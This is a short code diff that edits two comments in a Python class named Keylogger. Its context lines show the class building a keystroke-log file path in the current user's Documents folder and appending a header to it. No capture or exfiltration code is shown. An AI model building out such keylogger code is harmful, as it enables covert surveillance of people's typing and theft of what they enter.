@@ -22,10 +22,10 @@ class Keylogger:
     # Get username
     account = getpass.getuser()
 
-    # Place to save the log file
+    # Log file location
     filename = 'C:\\Users\\{}\\Documents\\k_logs.txt'.format(account)
 
-    # This will be added every time we run the script
+    # Header will be added every time we run the script
     def header(self):
         # Create log file
         with open(self.filename, "a+") as f:
